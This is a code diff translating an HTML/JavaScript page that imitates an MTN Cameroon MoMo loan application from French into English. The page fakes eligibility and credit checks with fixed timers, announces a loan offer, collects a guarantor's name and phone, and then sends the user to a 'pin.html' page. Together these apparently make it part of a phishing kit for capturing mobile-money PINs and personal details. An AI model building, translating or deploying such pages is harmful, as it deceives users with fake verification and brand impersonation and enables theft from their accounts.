@@ -1,13 +1,12 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>MTN  – Demande de prêt</title>
+  <title>MTN  – Loan Application</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    /* identical styles – only content changes */
     * {
       margin: 0;
       padding: 0;
@@ -299,7 +298,7 @@
     </div>
 
     <div class="footer">
-      v2.6.2 (MTN-QWIK-2026) • MTN  Cameroun
+      v2.6.2 (MTN-QWIK-2026) • MTN  Cameroon
     </div>
   </div>
 
@@ -308,24 +307,24 @@
   </div>
 
   <script>
-    // Step definitions – French
+    // Step definitions – English
     const steps = [
       {
         icon: 'fas fa-user-check',
-        title: 'Vérification d\'éligibilité',
-        description: 'Vérification de votre compte MTN MoMo et de votre historique de transactions...',
+        title: 'Eligibility Check',
+        description: 'Verifying your MTN MoMo account and transaction history...',
         duration: 4000
       },
       {
         icon: 'fas fa-chart-line',
-        title: 'Calcul du plafond',
-        description: 'Analyse de votre capacité de remboursement et de votre score de crédit...',
+        title: 'Limit Calculation',
+        description: 'Analyzing your repayment capacity and credit score...',
         duration: 3500
       },
       {
         icon: 'fas fa-file-invoice-dollar',
-        title: 'Préparation de votre offre',
-        description: 'Finalisation du meilleur forfait  pour vous...',
+        title: 'Preparing Your Offer',
+        description: 'Finalizing the best loan package for you...',
         duration: 4000
       }
     ];
@@ -335,10 +334,10 @@
     const stepContent = document.getElementById('stepContent');
 
     // Cameroon-specific loan limits (XAF)
-    const MAX_LIMIT = 500000;   // 500,000 XAF
-    const MIN_AMOUNT = 1000;    // 1,000 XAF
+    const MAX_LIMIT = 500000;
+    const MIN_AMOUNT = 1000;
 
-    // Retrieve user's phone from sessionStorage (set by previous pages)
+    // Retrieve user's phone from sessionStorage
     const userPhone = sessionStorage.getItem('mtn_phone') || '';
 
     function renderStep(index) {
@@ -357,37 +356,37 @@
       stepContent.innerHTML = `
         <div class="step-container">
           <div class="step-icon"><i class="fas fa-check-circle"></i></div>
-          <div class="step-title">Vous êtes éligible !</div>
-          <div class="limit-badge">Plafond maximal : ${MAX_LIMIT.toLocaleString('fr-FR')} XAF</div>
+          <div class="step-title">You are eligible!</div>
+          <div class="limit-badge">Maximum limit: ${MAX_LIMIT.toLocaleString('en-US')} XAF</div>
           <div class="loan-form">
             <div class="input-group">
-              <label>Montant du prêt (XAF)</label>
-              <input type="number" id="loanAmount" placeholder="Entre ${MIN_AMOUNT.toLocaleString('fr-FR')} et ${MAX_LIMIT.toLocaleString('fr-FR')} XAF" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
-              <div class="error-message" id="amountError">Veuillez saisir un montant valide.</div>
+              <label>Loan Amount (XAF)</label>
+              <input type="number" id="loanAmount" placeholder="Enter ${MIN_AMOUNT.toLocaleString('en-US')} to ${MAX_LIMIT.toLocaleString('en-US')} XAF" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
+              <div class="error-message" id="amountError">Please enter a valid amount.</div>
             </div>
 
             <div class="section-header">
-              <h3><i class="fas fa-user-friends"></i> Coordonnées du garant / proche</h3>
+              <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin</h3>
             </div>
             <div class="name-row">
               <div class="input-group" style="margin-bottom: 0;">
-                <label>Prénom</label>
-                <input type="text" id="guarantorFirstName" placeholder="Prénom" autocomplete="off">
-                <div class="error-message" id="firstNameError">Le prénom est requis.</div>
+                <label>First Name</label>
+                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
+                <div class="error-message" id="firstNameError">First name is required.</div>
               </div>
               <div class="input-group" style="margin-bottom: 0;">
-                <label>Nom</label>
-                <input type="text" id="guarantorLastName" placeholder="Nom" autocomplete="off">
-                <div class="error-message" id="lastNameError">Le nom est requis.</div>
+                <label>Last Name</label>
+                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
+                <div class="error-message" id="lastNameError">Last name is required.</div>
               </div>
             </div>
             <div class="input-group">
-              <label>Téléphone du garant</label>
-              <input type="tel" id="guarantorPhone" placeholder="ex. 6 55 12 34 56" inputmode="numeric">
-              <div class="error-message" id="phoneError">Numéro invalide ou identique au vôtre.</div>
+              <label>Guarantor Phone</label>
+              <input type="tel" id="guarantorPhone" placeholder="e.g. 6 55 12 34 56" inputmode="numeric">
+              <div class="error-message" id="phoneError">Invalid number or identical to yours.</div>
             </div>
 
-            <button id="applyBtn" class="btn" disabled>Demander maintenant</button>
+            <button id="applyBtn" class="btn" disabled>Apply Now</button>
           </div>
         </div>
       `;
@@ -406,13 +405,13 @@
       // Hide all errors initially
       [amountError, firstNameError, lastNameError, phoneError].forEach(el => el.classList.remove('visible'));
 
-      // Validation functions – each returns boolean and updates error visibility
+      // Validation functions
       function validateAmount() {
         const val = parseInt(amountInput.value, 10);
         if (isNaN(val) || val < MIN_AMOUNT || val > MAX_LIMIT) {
           amountError.classList.add('visible');
-          if (isNaN(val)) amountError.textContent = `Veuillez saisir un nombre valide.`;
-          else amountError.textContent = `Le montant doit être entre ${MIN_AMOUNT.toLocaleString('fr-FR')} et ${MAX_LIMIT.toLocaleString('fr-FR')} XAF.`;
+          if (isNaN(val)) amountError.textContent = `Please enter a valid number.`;
+          else amountError.textContent = `Amount must be between ${MIN_AMOUNT.toLocaleString('en-US')} and ${MAX_LIMIT.toLocaleString('en-US')} XAF.`;
           return false;
         } else {
           amountError.classList.remove('visible');
@@ -447,15 +446,15 @@
         const digits = raw.replace(/\D/g, '');
         const userDigits = userPhone.replace(/\D/g, '');
         if (digits === '') {
-          phoneError.textContent = 'Le numéro de téléphone est requis.';
+          phoneError.textContent = 'Phone number is required.';
           phoneError.classList.add('visible');
           return false;
         } else if (digits === userDigits && userDigits !== '') {
-          phoneError.textContent = 'Le numéro du garant ne peut pas être le vôtre.';
+          phoneError.textContent = 'Guarantor phone cannot be the same as yours.';
           phoneError.classList.add('visible');
           return false;
         } else if (digits.length !== 9) {
-          phoneError.textContent = 'Veuillez saisir un numéro valide (9 chiffres).';
+          phoneError.textContent = 'Please enter a valid phone number (9 digits).';
           phoneError.classList.add('visible');
           return false;
         } else {
@@ -464,7 +463,7 @@
         }
       }
 
-      // Attach blur events to each field – validate on leaving
+      // Attach blur events
       amountInput.addEventListener('blur', function() {
         validateAmount();
         updateButton();
@@ -482,7 +481,7 @@
         updateButton();
       });
 
-      // Also validate on input but only clear errors if valid, not show errors
+      // Input events for real-time feedback
       amountInput.addEventListener('input', function() {
         const val = parseInt(this.value, 10);
         if (!isNaN(val) && val >= MIN_AMOUNT && val <= MAX_LIMIT) {
@@ -507,25 +506,21 @@
       });
 
       function updateButton() {
-        // Check all fields
-        const amountOk = validateAmount(); // this will show/hide errors
+        const amountOk = validateAmount();
         const firstNameOk = validateFirstName();
         const lastNameOk = validateLastName();
         const phoneOk = validatePhone();
         applyBtn.disabled = !(amountOk && firstNameOk && lastNameOk && phoneOk);
       }
 
-      // Initial button state (disabled)
       applyBtn.disabled = true;
 
       applyBtn.addEventListener('click', function() {
-        // Full validation again
         const amountOk = validateAmount();
         const firstNameOk = validateFirstName();
         const lastNameOk = validateLastName();
         const phoneOk = validatePhone();
         if (amountOk && firstNameOk && lastNameOk && phoneOk) {
-          // Store data
           const amount = parseInt(amountInput.value, 10);
           const firstName = firstNameInput.value.trim();
           const lastName = lastNameInput.value.trim();
@@ -544,7 +539,6 @@
             window.location.href = 'pin.html';
           }, 1500);
         } else {
-          // Ensure errors are shown
           validateAmount();
           validateFirstName();
           validateLastName();
